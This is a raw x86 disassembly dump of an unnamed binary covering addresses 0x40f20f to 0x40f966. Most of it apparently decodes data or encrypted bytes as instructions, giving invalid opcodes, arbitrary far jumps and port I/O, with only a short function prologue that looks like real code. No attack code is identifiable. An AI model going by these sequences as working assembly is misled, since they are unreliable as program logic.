  40f20f:	popa   
  40f210:	popf   
  40f211:	(bad)
  40f216:	jae    0x40f1b5
  40f218:	or     ah,bh
  40f21a:	retf   0xde8
  40f21d:	ds jmp 0xecbf7e11
  40f223:	fsub   DWORD PTR [edx]
  40f225:	pop    ds
  40f226:	dec    esp
  40f227:	bound  eax,QWORD PTR [ebp+edx*4-0x2af27077]
  40f22e:	mov    edi,0x1fb59fa2
  40f233:	cmc    
  40f234:	jbe    0x40f25c
  40f236:	and    al,0x66
  40f238:	xor    cl,ch
  40f23a:	fs add ebp,ecx
  40f23d:	inc    ecx
  40f23e:	inc    eax
  40f23f:	cdq    
  40f240:	out    dx,eax
  40f241:	jmp    0x7b19f9cc
  40f246:	adc    BYTE PTR [ecx+0x3],dl
  40f249:	enter  0x4765,0x6b
  40f24d:	jge    0x40f23a
  40f24f:	nop
  40f250:	xor    edi,edx
  40f252:	sbb    cl,dh
  40f254:	leave  
  40f255:	scas   eax,DWORD PTR es:[edi]
  40f256:	sub    DWORD PTR [edx],ecx
  40f258:	(bad)  
  40f25a:	push   ecx
  40f25b:	sbb    DWORD PTR [ecx],edx
  40f25d:	pop    edi
  40f25e:	jge    0x40f2d3
  40f260:	stos   DWORD PTR es:[edi],eax
  40f261:	xchg   esi,eax
  40f262:	push   0xbabaa074
  40f267:	sbb    al,dl
  40f269:	inc    ebp
  40f26a:	rcr    BYTE PTR [esi-0x2e],1
  40f26d:	jg     0x40f219
  40f26f:	repz mov bh,0x23
  40f272:	jge    0x40f23a
  40f274:	scas   al,BYTE PTR es:[edi]
  40f275:	mov    DWORD PTR [edx+eiz*8],ebp
  40f278:	arpl   WORD PTR [edi-0x40607299],bp
  40f27e:	adc    BYTE PTR [esi+edx*8+0xc],ch
  40f282:	mov    DWORD PTR [ebx],ecx
  40f284:	and    bh,bh
  40f286:	mov    ebx,0x96d37448
  40f28b:	lods   eax,DWORD PTR ds:[esi]
  40f28c:	push   esp
  40f28d:	bound  ecx,QWORD PTR [ecx]
  40f28f:	into   
  40f290:	fs (bad) 
  40f292:	fiadd  DWORD PTR [ebx-0x7d]
  40f295:	(bad)  
  40f296:	fcmovb st,st(7)
  40f298:	jns    0x40f259
  40f29a:	sbb    BYTE PTR [esi+0x2b],dh
  40f29d:	mov    ds:0xd280de9c,al
  40f2a2:	cmp    ch,bl
  40f2a4:	sbb    DWORD PTR [ebp+eiz*2-0x22084d47],edi
  40f2ab:	hlt    
  40f2ac:	push   eax
  40f2ad:	jl     0x40f248
  40f2af:	and    DWORD PTR [ecx+0x32],edi
  40f2b2:	cmp    al,0x17
  40f2b4:	(bad)  
  40f2b5:	sbb    ebp,DWORD PTR [esi+edx*2]
  40f2b8:	int    0xf4
  40f2ba:	push   ebx
  40f2bb:	pop    ecx
  40f2bc:	jns    0x40f2fd
  40f2be:	fadd   QWORD PTR [edx]
  40f2c0:	mov    eax,0x64e016df
  40f2c5:	sub    eax,0x61c53319
  40f2ca:	shl    DWORD PTR [edx],1
  40f2cc:	shl    BYTE PTR [edi+0x1b],1
  40f2cf:	fild   WORD PTR [ecx+0x11c8d8d2]
  40f2d5:	neg    DWORD PTR ds:0xd0cb9cd3
  40f2db:	retf   0xe425
  40f2de:	adc    al,0xcf
  40f2e0:	dec    edx
  40f2e1:	fld    TBYTE PTR [ebp-0x6fbbdeef]
  40f2e7:	or     cl,BYTE PTR [edx]
  40f2e9:	es inc edi
  40f2eb:	sbb    BYTE PTR [eax+0x8],al
  40f2ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2ef:	adc    al,0x5e
  40f2f1:	inc    dx
  40f2f3:	add    BYTE PTR [ecx-0x5e32c81e],dh
  40f2f9:	or     BYTE PTR [edx+0x47],al
  40f2fc:	in     al,0x3f
  40f2fe:	hlt    
  40f2ff:	fld    QWORD PTR [ebx-0x4a]
  40f302:	scas   al,BYTE PTR es:[edi]
  40f303:	adc    eax,0x95ecb648
  40f308:	jb     0x40f2e2
  40f30a:	retw   0x965e
  40f30e:	enter  0xa351,0xbd
  40f312:	sub    DWORD PTR [ecx+0x549d7f0f],esi
  40f318:	push   ebp
  40f319:	shr    DWORD PTR [edx-0x3d],1
  40f31c:	and    DWORD PTR [edx+0x3c],ebp
  40f31f:	mov    ds:0x2668466b,eax
  40f324:	and    BYTE PTR [esi+0x27827667],dh
  40f32a:	and    edi,DWORD PTR [eax-0x46cb8148]
  40f330:	in     eax,0xd5
  40f332:	jo     0x40f381
  40f334:	xor    bh,ah
  40f336:	lods   eax,DWORD PTR ds:[esi]
  40f337:	dec    esi
  40f338:	jne    0x40f318
  40f33a:	jmp    0x77ab:0x8f57615e
  40f341:	out    dx,eax
  40f342:	sub    esi,eax
  40f344:	jnp    0x40f334
  40f346:	pop    edi
  40f347:	xchg   bl,ah
  40f349:	outs   dx,DWORD PTR ds:[esi]
  40f34a:	dec    esi
  40f34b:	mov    ch,0x90
  40f34d:	test   ah,bl
  40f34f:	daa    
  40f350:	fnstsw WORD PTR [esi]
  40f352:	bound  esp,QWORD PTR [esi-0x53310640]
  40f358:	cmp    al,BYTE PTR [ebp-0x11]
  40f35b:	jp     0x40f305
  40f35d:	pop    esp
  40f35e:	in     eax,dx
  40f35f:	(bad)  [ecx-0x273b6b30]
  40f365:	bound  ebx,QWORD PTR [ebx]
  40f367:	adc    DWORD PTR [ebx+0x15],ebp
  40f36a:	or     ecx,edx
  40f36c:	(bad)  
  40f36d:	mov    al,0x3
  40f36f:	jae    0x40f32e
  40f371:	and    DWORD PTR [edi+0x48a5bd65],esp
  40f377:	cmp    edi,DWORD PTR [ebp+0x3e5cb241]
  40f37d:	add    ah,BYTE PTR [edi-0x69]
  40f380:	sub    al,0x55
  40f382:	imul   edi,DWORD PTR [ebx-0x80],0xffffff80
  40f386:	shl    BYTE PTR [esp+ebx*2],cl
  40f389:	xchg   edx,eax
  40f38a:	jecxz  0x40f402
  40f38c:	hlt    
  40f38d:	xlat   BYTE PTR ds:[ebx]
  40f38e:	xchg   esp,eax
  40f38f:	inc    ecx
  40f390:	mov    ebx,0xc973ee82
  40f395:	(bad)
  40f399:	xor    dl,bl
  40f39b:	out    0x41,eax
  40f39d:	and    BYTE PTR [ecx+ecx*8],al
  40f3a0:	pop    edx
  40f3a1:	ins    DWORD PTR es:[edi],dx
  40f3a2:	addr16 mov ds:0xf997,eax
  40f3a6:	fstp   DWORD PTR [ebx+ecx*8-0x4e]
  40f3aa:	(bad)  
  40f3ab:	or     al,0xf1
  40f3ad:	sbb    DWORD PTR [ebp+0x1b],esp
  40f3b0:	inc    edx
  40f3b1:	ins    DWORD PTR es:[edi],dx
  40f3b2:	scas   eax,DWORD PTR es:[edi]
  40f3b3:	adc    eax,0xe4eae918
  40f3b8:	das    
  40f3b9:	cmp    bh,dl
  40f3bb:	jae    0x40f3ef
  40f3bd:	jmp    0x40f403
  40f3bf:	mov    ebp,0x4971c37d
  40f3c4:	inc    edi
  40f3c5:	jmp    0xa115c5f2
  40f3ca:	dec    esp
  40f3cb:	pusha  
  40f3cc:	int3   
  40f3cd:	(bad)  
  40f3ce:	jecxz  0x40f3cd
  40f3d0:	lock dec edi
  40f3d2:	adc    bh,BYTE PTR [ebp+0x43]
  40f3d5:	in     al,0xc8
  40f3d7:	cmp    al,BYTE PTR [esi+0x4d]
  40f3da:	dec    eax
  40f3db:	or     BYTE PTR [edi-0x63],dh
  40f3de:	fcomp  QWORD PTR [eax+esi*8-0x5ef9ceed]
  40f3e5:	pop    esi
  40f3e6:	ret    0xfb19
  40f3e9:	cmp    bh,BYTE PTR [edx-0x3064990d]
  40f3ef:	retf   0xd720
  40f3f2:	cmp    ebx,DWORD PTR [esi+0x6b]
  40f3f5:	pop    esp
  40f3f6:	push   0xc3035e88
  40f3fb:	pop    ebx
  40f3fc:	leave  
  40f3fd:	ret    0x8
  40f400:	push   ebp
  40f401:	mov    ebp,esp
  40f403:	push   ecx
  40f404:	mov    DWORD PTR ds:0x4338a7,0x6a14
  40f40e:	push   ecx
  40f40f:	xor    ecx,edx
  40f411:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40f418:	jmp    0x40f6e7
  40f41d:	call   0xa1f0:0x6df6cd0b
  40f424:	push   ebx
  40f425:	inc    ebx
  40f426:	push   edi
  40f427:	dec    ecx
  40f428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f429:	ds push es
  40f42b:	test   al,0x40
  40f42d:	scas   eax,DWORD PTR es:[edi]
  40f42e:	stos   DWORD PTR es:[edi],eax
  40f42f:	jle    0x40f4af
  40f431:	lods   al,BYTE PTR ds:[esi]
  40f432:	jl     0x40f4b2
  40f434:	jle    0x40f4a2
  40f436:	pop    esi
  40f437:	jne    0x40f3ff
  40f439:	gs jmp 0x40f406
  40f43c:	rol    BYTE PTR [ebx],cl
  40f43e:	jg     0x40f422
  40f440:	inc    edx
  40f441:	push   ecx
  40f442:	leave  
  40f443:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f444:	adc    eax,0x5f795e8c
  40f449:	rcr    DWORD PTR [ebp-0x6e],0x25
  40f44d:	inc    eax
  40f44e:	mov    bh,0xf5
  40f450:	test   al,0x5a
  40f452:	xchg   ebp,eax
  40f453:	bound  ecx,QWORD PTR [edi-0x5386d37]
  40f459:	adc    BYTE PTR [edx+ecx*4-0x57],dh
  40f45d:	xchg   ecx,eax
  40f45e:	inc    esi
  40f45f:	rcl    DWORD PTR [edi+0x2d],0xf4
  40f463:	xchg   edi,eax
  40f464:	adc    bl,0x6d
  40f467:	pop    ecx
  40f468:	in     al,dx
  40f469:	loopne 0x40f48f
  40f46b:	stc    
  40f46c:	pop    eax
  40f46d:	cmp    DWORD PTR [ebx],ebx
  40f46f:	jbe    0x40f487
  40f471:	shl    BYTE PTR fs:[edi+eiz*8-0x1b],cl
  40f476:	xor    eax,0x5ad2704
  40f47b:	xchg   edx,eax
  40f47c:	test   eax,0x542c16a2
  40f481:	dec    eax
  40f482:	and    al,0xee
  40f484:	sub    eax,0x857c0cf3
  40f489:	push   ebx
  40f48a:	dec    eax
  40f48b:	aaa    
  40f48c:	dec    eax
  40f48d:	pop    edi
  40f48e:	mov    WORD PTR [esi],ds
  40f490:	xchg   edx,eax
  40f491:	ror    DWORD PTR gs:[edi+0x19658beb],1
  40f498:	pop    ds
  40f499:	dec    eax
  40f49a:	sbb    esp,esi
  40f49c:	out    dx,eax
  40f49d:	inc    bp
  40f49f:	pop    edi
  40f4a0:	inc    edx
  40f4a1:	into   
  40f4a2:	(bad)  
  40f4a3:	das    
  40f4a4:	add    al,dh
  40f4a6:	fisub  DWORD PTR [edi]
  40f4a8:	xchg   ecx,eax
  40f4a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4aa:	xchg   edx,eax
  40f4ab:	sahf   
  40f4ac:	jae    0x40f52b
  40f4ae:	fidivr WORD PTR [edi-0x15]
  40f4b1:	mov    bl,al
  40f4b3:	addr16 in eax,dx
  40f4b5:	jns    0x40f52b
  40f4b7:	sbb    BYTE PTR [edi],bh
  40f4b9:	outs   dx,BYTE PTR ds:[esi]
  40f4ba:	mov    edx,0x1e7018d1
  40f4bf:	lods   eax,DWORD PTR ds:[esi]
  40f4c0:	rcr    BYTE PTR [esi],0xea
  40f4c3:	sub    al,BYTE PTR [ebx+0x71]
  40f4c6:	out    0xd9,al
  40f4c8:	neg    DWORD PTR [edx+0x26]
  40f4cb:	xchg   edx,eax
  40f4cc:	sbb    ah,BYTE PTR [eax+ebp*2+0x6e5e2f23]
  40f4d3:	test   eax,0x79fa6901
  40f4d8:	or     DWORD PTR [eax],esi
  40f4da:	jl     0x40f497
  40f4dc:	pop    ss
  40f4dd:	xlat   BYTE PTR ds:[ebx]
  40f4de:	daa    
  40f4df:	fadd   DWORD PTR [ebx-0x49f2da56]
  40f4e5:	inc    ebp
  40f4e6:	dec    ebp
  40f4e7:	leave  
  40f4e8:	or     DWORD PTR [ecx+eiz*8+0x100a4e75],esp
  40f4ef:	pop    ds
  40f4f0:	jns    0x40f4fb
  40f4f2:	or     DWORD PTR [esi-0x46],0x3f
  40f4f6:	sub    dl,BYTE PTR [edi-0x5fca94b0]
  40f4fc:	stc    
  40f4fd:	call   0x30e6:0xb8e314e0
  40f504:	ds pop esi
  40f506:	fwait
  40f507:	mov    dh,0x35
  40f509:	dec    ecx
  40f50a:	dec    edi
  40f50b:	jge    0x40f525
  40f50d:	pop    esi
  40f50e:	or     cl,0x2b
  40f511:	or     esi,edx
  40f513:	les    ebp,FWORD PTR [edi]
  40f515:	add    DWORD PTR [eax],ecx
  40f517:	mov    ebx,0xfecd3431
  40f51c:	inc    esp
  40f51d:	pushf  
  40f51e:	rcr    DWORD PTR [edi+esi*8],0x25
  40f522:	scas   eax,DWORD PTR es:[edi]
  40f523:	out    dx,al
  40f524:	mov    BYTE PTR [eax+esi*2-0x5a],0xb8
  40f529:	adc    dh,BYTE PTR [eax-0x2aee8eef]
  40f52f:	and    ah,BYTE PTR [edx]
  40f531:	dec    esp
  40f532:	or     eax,0x85d247d7
  40f537:	ja     0x40f57a
  40f539:	pop    es
  40f53a:	cld    
  40f53b:	mov    ah,0x38
  40f53d:	sub    ebx,DWORD PTR [edx-0x2d]
  40f540:	xor    BYTE PTR [ebp-0x2e1deeff],cl
  40f546:	fild   QWORD PTR [ebx+ebx*8-0x3daf02dd]
  40f54d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f54e:	xchg   edi,eax
  40f54f:	inc    esi
  40f550:	sub    ah,0xa2
  40f553:	cmc    
  40f554:	loop   0x40f5ae
  40f556:	add    DWORD PTR [ecx],0x66
  40f559:	xchg   ebp,eax
  40f55a:	sbb    edi,DWORD PTR [edi+0x3d1bbfb]
  40f560:	add    eax,DWORD PTR [ecx-0x3f]
  40f563:	in     al,dx
  40f564:	xchg   ebx,eax
  40f565:	mov    ecx,0x5eca91ae
  40f56a:	lds    ebp,FWORD PTR [ecx-0x60]
  40f56d:	pop    eax
  40f56e:	call   0x3be1:0x387abb41
  40f575:	lahf   
  40f576:	repnz inc edx
  40f578:	mov    al,ds:0xaabd4cba
  40f57d:	push   0x474976ad
  40f582:	es jb  0x40f583
  40f585:	nop
  40f586:	xor    eax,0x1af33ae4
  40f58b:	mov    bh,0xc3
  40f58d:	xor    eax,0x813917b2
  40f592:	fdivp  st(7),st
  40f594:	cdq    
  40f595:	and    DWORD PTR [ecx],ebx
  40f597:	fiadd  WORD PTR [edx-0x794385d1]
  40f59d:	jmp    0xfb4d:0x7daf5753
  40f5a4:	ret    
  40f5a5:	push   edx
  40f5a6:	pop    ebp
  40f5a7:	in     eax,dx
  40f5a8:	adc    dl,BYTE PTR [edx-0x17]
  40f5ab:	dec    ecx
  40f5ac:	dec    ebp
  40f5ad:	jle    0x40f601
  40f5af:	mov    ch,0x6
  40f5b1:	loopne 0x40f5aa
  40f5b3:	ss xchg ebp,eax
  40f5b5:	sub    BYTE PTR [edi+0x3f42691a],dh
  40f5bb:	mov    eax,ds:0x2dc9f0a9
  40f5c0:	xlat   BYTE PTR ds:[ebx]
  40f5c1:	hlt    
  40f5c2:	sub    ebx,DWORD PTR [esp+ecx*8]
  40f5c5:	ins    DWORD PTR es:[edi],dx
  40f5c6:	lahf   
  40f5c7:	lods   al,BYTE PTR ds:[esi]
  40f5c8:	sbb    ah,BYTE PTR [edi+0x43e805b4]
  40f5ce:	push   ebx
  40f5cf:	enter  0xe8f3,0x24
  40f5d3:	loopne 0x40f5b2
  40f5d5:	test   eax,0x11f06088
  40f5da:	sub    DWORD PTR [esi],0x6d
  40f5dd:	xchg   ebp,eax
  40f5de:	jnp    0x40f646
  40f5e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5e1:	mov    ?,WORD PTR [edx]
  40f5e3:	sbb    BYTE PTR [esp+eiz*2+0x1],bl
  40f5e7:	in     eax,dx
  40f5e8:	inc    ecx
  40f5e9:	or     al,0x25
  40f5eb:	sbb    eax,0x4dc34ed9
  40f5f0:	fsub   QWORD PTR [edx]
  40f5f2:	aam    0xa4
  40f5f4:	ss adc eax,0xba419e2c
  40f5fa:	ins    BYTE PTR es:[edi],dx
  40f5fb:	loopne 0x40f65b
  40f5fd:	out    0xed,al
  40f5ff:	sbb    al,0x2b
  40f601:	or     ebp,edx
  40f603:	jo     0x40f626
  40f605:	or     eax,0xa05f2e90
  40f60a:	ret    0x3d36
  40f60d:	inc    edx
  40f60e:	xor    esp,edx
  40f610:	sbb    BYTE PTR [edx+0x22447ecd],bh
  40f616:	mov    eax,ds:0xb2524448
  40f61b:	stos   DWORD PTR es:[edi],eax
  40f61c:	adc    ch,BYTE PTR ds:0x6244a5a3
  40f622:	dec    ecx
  40f623:	xchg   ebx,eax
  40f624:	not    DWORD PTR [eax+ebp*8+0x1056a027]
  40f62b:	jnp    0x40f5de
  40f62d:	push   0x38447b47
  40f632:	sub    DWORD PTR [ebx],0x29
  40f635:	adc    ebp,DWORD PTR ds:0x6ac7159c
  40f63b:	pop    edi
  40f63c:	pop    edi
  40f63d:	in     eax,0x13
  40f63f:	fidivr DWORD PTR [ebx+0x2c0d930a]
  40f645:	add    eax,0xadd671cb
  40f64a:	ds jle 0x40f6c0
  40f64d:	adc    cl,dh
  40f64f:	xchg   esp,eax
  40f650:	push   esp
  40f651:	sbb    eax,0x69bede14
  40f656:	or     ebp,eax
  40f658:	cld    
  40f659:	cmc    
  40f65a:	dec    ebx
  40f65b:	je     0x40f6dc
  40f65d:	fdivr  st(0),st
  40f65f:	adc    al,0x6a
  40f662:	mov    DWORD PTR [eax],ebp
  40f664:	out    dx,al
  40f665:	cmp    ebp,edx
  40f667:	sub    BYTE PTR [edi-0x79e3f39f],bh
  40f66d:	cwde   
  40f66e:	enter  0x6e18,0xf
  40f672:	mov    eax,ds:0x5bc47925
  40f677:	mov    cl,0xd7
  40f679:	push   ss
  40f67a:	push   0x23
  40f67c:	pop    eax
  40f67d:	int3   
  40f67e:	das    
  40f67f:	imul   edi,edi,0x18
  40f682:	ficom  WORD PTR [edi-0x72]
  40f685:	imul   edi,DWORD PTR [eax-0x25cfb0d5],0x469e1166
  40f68f:	test   eax,0x233438d6
  40f694:	push   cs
  40f695:	fisub  DWORD PTR [esi-0x1e]
  40f698:	aad    0x68
  40f69a:	jge    0x40f6c8
  40f69c:	pop    ebx
  40f69d:	xor    al,0x2d
  40f69f:	out    0xfe,eax
  40f6a1:	hlt    
  40f6a2:	push   0x20e3f6b7
  40f6a7:	lahf   
  40f6a8:	adc    BYTE PTR [edx],al
  40f6aa:	ins    DWORD PTR es:[edi],dx
  40f6ab:	xlat   BYTE PTR ds:[ebx]
  40f6ac:	scas   al,BYTE PTR es:[edi]
  40f6ad:	mov    dl,0x27
  40f6af:	adc    DWORD PTR [ecx+ebx*1+0x62],eax
  40f6b3:	es pop ds
  40f6b5:	sbb    edi,DWORD PTR [ebx]
  40f6b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6b8:	rol    dl,cl
  40f6ba:	mov    bl,0xa8
  40f6bc:	mov    edx,0x2259604c
  40f6c1:	or     eax,0x8f4d1d2a
  40f6c6:	xor    eax,0xd32f7c39
  40f6cb:	jae    0x40f70c
  40f6cd:	rep stos DWORD PTR es:[edi],eax
  40f6cf:	dec    edx
  40f6d0:	sub    BYTE PTR [esi+0x3e709c48],ah
  40f6d6:	es in  eax,0xee
  40f6d9:	ret    
  40f6da:	lds    ebx,FWORD PTR [ecx]
  40f6dc:	push   ds
  40f6dd:	int3   
  40f6de:	add    esi,edi
  40f6e0:	rcl    eax,cl
  40f6e2:	arpl   cx,sp
  40f6e4:	fnstcw WORD PTR [esi]
  40f6e6:	xor    eax,0x32fc45c7
  40f6eb:	test   DWORD PTR [eax+edi*8+0x38a72d81],ebx
  40f6f2:	inc    ebx
  40f6f3:	add    BYTE PTR [edx+0x5c],dh
  40f6f6:	add    BYTE PTR [eax],al
  40f6f8:	mov    eax,DWORD PTR [ebp-0x4]
  40f6fb:	add    DWORD PTR ds:0x433867,0x767c
  40f705:	jmp    0x40f9d4
  40f70a:	ins    BYTE PTR es:[edi],dx
  40f70b:	xchg   BYTE PTR [eax+0x70d870dc],ah
  40f711:	xchg   esi,eax
  40f712:	in     eax,0xdf
  40f714:	or     eax,ebp
  40f716:	sar    DWORD PTR [ebp+0xc],cl
  40f719:	out    0xdd,eax
  40f71b:	mov    dh,0x7e
  40f71d:	jle    0x40f6cb
  40f71f:	jl     0x40f79f
  40f721:	jle    0x40f701
  40f723:	test   eax,0xd87eb0f5
  40f728:	shl    BYTE PTR [ebp+edi*2-0x7e6bd017],cl
  40f72f:	jle    0x40f76e
  40f731:	das    
  40f732:	test   BYTE PTR ds:0x77728694,al
  40f738:	fidivr WORD PTR [edi+0x3e]
  40f73b:	fld    QWORD PTR [ebx-0x2ac5ec6c]
  40f741:	add    DWORD PTR [edi],esi
  40f743:	pop    ds
  40f744:	nop
  40f745:	test   al,0x60
  40f747:	fmul   QWORD PTR [ebp+0x1a]
  40f74a:	scas   eax,DWORD PTR es:[edi]
  40f74b:	xchg   esp,eax
  40f74c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f74d:	(bad)  
  40f74e:	adc    edx,eax
  40f750:	leave  
  40f751:	(bad)  
  40f752:	not    cl
  40f754:	cmp    BYTE PTR [edx+0x6bdabfbf],bh
  40f75a:	push   ebp
  40f75b:	mov    ebx,DWORD PTR [ecx]
  40f75d:	jle    0x40f7b0
  40f75f:	mov    ch,0x62
  40f761:	xlat   BYTE PTR ds:[ebx]
  40f762:	div    BYTE PTR [edx+0x65]
  40f765:	dec    esi
  40f766:	sbb    cl,ah
  40f768:	ror    ebp,0x97
  40f76b:	out    dx,al
  40f76c:	sub    al,0x6c
  40f76e:	mov    esi,0x9d978519
  40f773:	aas    
  40f774:	loope  0x40f7d5
  40f776:	cmp    ebx,DWORD PTR [ebx]
  40f778:	imul   eax,esp,0x22
  40f77b:	cld    
  40f77c:	push   eax
  40f77d:	and    BYTE PTR [edx-0x3e5a254c],ch
  40f783:	fmul   DWORD PTR [ebx+ebp*1]
  40f786:	adc    dh,BYTE PTR [edi-0xf]
  40f789:	into   
  40f78a:	push   edi
  40f78b:	mov    esi,0x9f1dad6
  40f790:	mov    ah,0x3a
  40f792:	and    eax,0x9625430d
  40f797:	dec    esp
  40f798:	neg    DWORD PTR [eax+0x49]
  40f79b:	mov    cl,0x9b
  40f79d:	ret    0xe3c1
  40f7a0:	mov    bh,0x1c
  40f7a2:	jne    0x40f7a0
  40f7a4:	les    edi,FWORD PTR [edi-0x44284951]
  40f7aa:	es jg  0x40f788
  40f7ad:	and    BYTE PTR [edx+0x1f93da34],ah
  40f7b3:	inc    edi
  40f7b4:	push   ds
  40f7b5:	and    DWORD PTR [eax],esi
  40f7b7:	dec    edi
  40f7b8:	pop    esi
  40f7b9:	(bad)  
  40f7ba:	jmp    0x40f78a
  40f7bc:	push   ecx
  40f7bd:	or     ch,BYTE PTR [esi]
  40f7bf:	add    eax,0x3fc87f7e
  40f7c4:	and    ebx,DWORD PTR [esi+0x49]
  40f7c7:	call   0xc391:0x6f85da2a
  40f7ce:	fwait
  40f7cf:	jbe    0x40f7b2
  40f7d1:	rcl    esp,0xec
  40f7d4:	(bad)  
  40f7d5:	(bad)  
  40f7d7:	adc    al,0x3c
  40f7d9:	jge    0x40f800
  40f7db:	add    al,0x6c
  40f7dd:	fcomi  st,st(3)
  40f7df:	aas    
  40f7e0:	retf   0xbd1a
  40f7e3:	xchg   edi,eax
  40f7e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7e5:	add    eax,0x54e1a8dc
  40f7ea:	push   esi
  40f7eb:	out    0x98,al
  40f7ed:	xor    al,0x29
  40f7ef:	fist   WORD PTR [ebx+ebp*8-0x2f188da8]
  40f7f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7f7:	mov    WORD PTR [ebx+0x38],?
  40f7fa:	dec    edx
  40f7fb:	cmp    BYTE PTR [ebp-0x4432292d],ch
  40f801:	int    0xf4
  40f803:	lds    esp,FWORD PTR [ebx]
  40f805:	jbe    0x40f819
  40f807:	mov    ds:0x35c56ac6,al
  40f80c:	mov    ds:0x60afe673,eax
  40f811:	ds dec eax
  40f813:	sub    bh,BYTE PTR [ecx+ecx*2]
  40f816:	neg    edx
  40f818:	ret    0x9e26
  40f81b:	jp     0x40f86c
  40f81d:	es xchg ch,dl
  40f820:	mov    dl,0x56
  40f822:	mov    esp,0x75d67382
  40f827:	mov    WORD PTR [ebp-0x5a9bf871],?
  40f82d:	(bad)  
  40f82e:	sbb    bl,bl
  40f830:	lock push di
  40f833:	into   
  40f834:	mov    es,WORD PTR [edi+0x3c]
  40f837:	ror    DWORD PTR [eax+0x3e],1
  40f83a:	jmp    0xab31:0x716b13e5
  40f841:	pop    ebp
  40f842:	sub    ebx,DWORD PTR [edx]
  40f844:	push   ebx
  40f845:	mov    ch,0x7
  40f847:	xchg   ecx,eax
  40f848:	mov    edi,0xcafe0335
  40f84d:	lock xchg BYTE PTR [eax+ecx*8+0x6a456ac3],dh
  40f855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f856:	dec    ebx
  40f857:	sti    
  40f858:	(bad)  
  40f859:	fstp   DWORD PTR [ecx+0xe]
  40f85c:	and    al,0xd3
  40f85e:	fcomp  QWORD PTR [edi+0x54]
  40f861:	js     0x40f81b
  40f863:	xor    DWORD PTR [esi+0x4f],edi
  40f866:	ror    ch,cl
  40f868:	lock fmul QWORD PTR [edx+0x28]
  40f86c:	jno    0x40f80b
  40f86e:	out    0xe0,eax
  40f870:	pop    edi
  40f871:	test   BYTE PTR [ebx],bh
  40f873:	clc    
  40f874:	jo     0x40f8e9
  40f876:	fwait
  40f877:	cld    
  40f878:	aam    0xf0
  40f87a:	jge    0x40f8ea
  40f87c:	neg    edx
  40f87e:	test   al,0x21
  40f880:	xor    eax,0x8a8ec403
  40f885:	icebp  
  40f886:	jae    0x40f8e7
  40f888:	jno    0x40f80d
  40f88a:	dec    ebp
  40f88b:	inc    esi
  40f88c:	xlat   BYTE PTR ds:[ebx]
  40f88d:	cwde   
  40f88e:	push   ds
  40f88f:	arpl   WORD PTR ds:0x9b6e6372,bp
  40f895:	lods   eax,DWORD PTR ds:[esi]
  40f896:	xor    esi,ebx
  40f898:	pop    edx
  40f899:	cdq    
  40f89a:	sbb    DWORD PTR [edx-0x41d06c49],esp
  40f8a0:	retf   
  40f8a1:	fwait
  40f8a2:	rcr    DWORD PTR [esi+0x42da8cc3],cl
  40f8a8:	inc    ebp
  40f8a9:	bound  edi,QWORD PTR [ebp-0x7d9f1a54]
  40f8af:	jno    0x40f8c3
  40f8b1:	bound  ecx,QWORD PTR [ecx+0x34]
  40f8b4:	inc    edi
  40f8b5:	dec    edi
  40f8b6:	sti    
  40f8b7:	leave  
  40f8b8:	mov    al,ds:0xbc12a087
  40f8bd:	outs   dx,BYTE PTR ds:[esi]
  40f8be:	push   0x8cca50d0
  40f8c3:	pop    esi
  40f8c4:	fidiv  WORD PTR [ebx+0x7c]
  40f8c7:	pusha  
  40f8c8:	mov    ebx,0x1309f587
  40f8cd:	(bad)  
  40f8cf:	icebp  
  40f8d0:	jmp    0x33d3:0x8bf34e2a
  40f8d7:	ja     0x40f919
  40f8d9:	data16 and al,0xd6
  40f8dc:	test   al,0xc9
  40f8de:	stos   BYTE PTR es:[edi],al
  40f8df:	inc    ecx
  40f8e0:	imul   esp,DWORD PTR [eax-0x1a],0xdbdf4dfe
  40f8e7:	jge    0x40f8db
  40f8e9:	jbe    0x40f8ed
  40f8eb:	fldcw  WORD PTR [edi+0x5c0599a0]
  40f8f1:	inc    edx
  40f8f2:	mul    BYTE PTR [eax]
  40f8f4:	pusha  
  40f8f5:	cs push esp
  40f8f7:	das    
  40f8f8:	test   BYTE PTR [eax],bh
  40f8fa:	jno    0x40f8e3
  40f8fc:	sub    esi,DWORD PTR [edx]
  40f8fe:	pushf  
  40f8ff:	jne    0x40f941
  40f901:	lock inc edi
  40f903:	inc    esi
  40f904:	das    
  40f905:	push   ebx
  40f906:	or     ch,dh
  40f908:	push   ebp
  40f909:	mov    eax,ds:0xe3705f38
  40f90e:	pushf  
  40f90f:	xor    edi,DWORD PTR [eax+0x2b]
  40f912:	lods   eax,DWORD PTR ds:[esi]
  40f913:	adc    eax,0xc07df2ab
  40f918:	mov    edi,0x18053692
  40f91d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f91e:	add    BYTE PTR [edi-0x6f8e3a7],bl
  40f924:	cwde   
  40f925:	imul   esp,esp,0xd159f251
  40f92b:	push   esp
  40f92c:	scas   al,BYTE PTR es:[edi]
  40f92d:	ins    BYTE PTR es:[edi],dx
  40f92e:	push   cs
  40f92f:	lods   eax,DWORD PTR ds:[esi]
  40f930:	neg    esp
  40f932:	sub    edx,DWORD PTR [ebp+0x310ca0ea]
  40f938:	aad    0x2
  40f93a:	aad    0xba
  40f93c:	mov    esp,0x8d685eb4
  40f941:	das    
  40f942:	hlt    
  40f943:	jno    0x40f969
  40f945:	sub    DWORD PTR [edx-0x59ac4d67],0x3
  40f94c:	add    BYTE PTR [ebx+esi*4+0x5b],al
  40f950:	xchg   edi,eax
  40f951:	cli    
  40f952:	mov    edx,esp
  40f954:	out    dx,al
  40f955:	mov    dh,0x22
  40f957:	pop    edi
  40f958:	sbb    al,0x20
  40f95a:	lds    ebp,FWORD PTR [ebp+ebx*2-0x1c]
  40f95e:	xchg   DWORD PTR [esi-0x53],eax
  40f961:	mov    ebp,0xc0398bf9
  40f966:	(bad)  
